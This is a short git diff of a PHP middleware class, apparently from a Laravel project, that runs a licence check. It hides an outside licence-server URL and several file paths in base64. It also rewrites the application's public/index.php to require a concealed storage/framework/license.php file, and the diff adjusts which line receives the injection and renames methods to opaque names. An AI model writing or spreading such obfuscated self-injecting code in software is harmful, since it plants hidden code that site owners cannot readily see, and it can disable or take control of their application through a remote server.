@@ -14,7 +14,7 @@ class LisMid
     public function handle(Request $request, Closure $next)
     {
         $codeu = "aHR0cHM6Ly9pbmZvcGFzcy5pbi9hcGkvbGljZW5zZS92MS9hdXRo";
-        if (!$this->licenseModifyAt()) {
+        if (!$this->lseModifyAt()) {
             self::mkFle();
             self::mkLtxt();
             $isLicenseValid = new LisSer($codeu);
@@ -91,9 +91,14 @@ class LisMid
     {
         $fileContent = file(rtrim(getcwd(), "/public") . "/public/index.php", FILE_IGNORE_NEW_LINES);
         $content = 'require rtrim(getcwd(), "/public") . base64_decode("L3N0b3JhZ2UvZnJhbWV3b3JrL2xpY2Vuc2UucGhw");';
-        if (empty(trim($fileContent[21]) == 1)) {
-            $fileContent[21] .= $content;
+        if (empty(trim($fileContent[22]))) {
+            $fileContent[22] .= $content;
             file_put_contents(rtrim(getcwd(), "/public") . "/public/index.php", implode("\n", $fileContent));
         }
     }
+
+
+    // if (!file_exists($maintenance = __DIR__ . '/../storage/app/license.php')) {
+    //     $filePath = touch((rtrim(getcwd(), base64_decode("L3B1YmxpYw")) . base64_decode("Ly92ZW5kb3IvL2F1dG9saWNlbnNlLnBocA")));
+    // }
 }
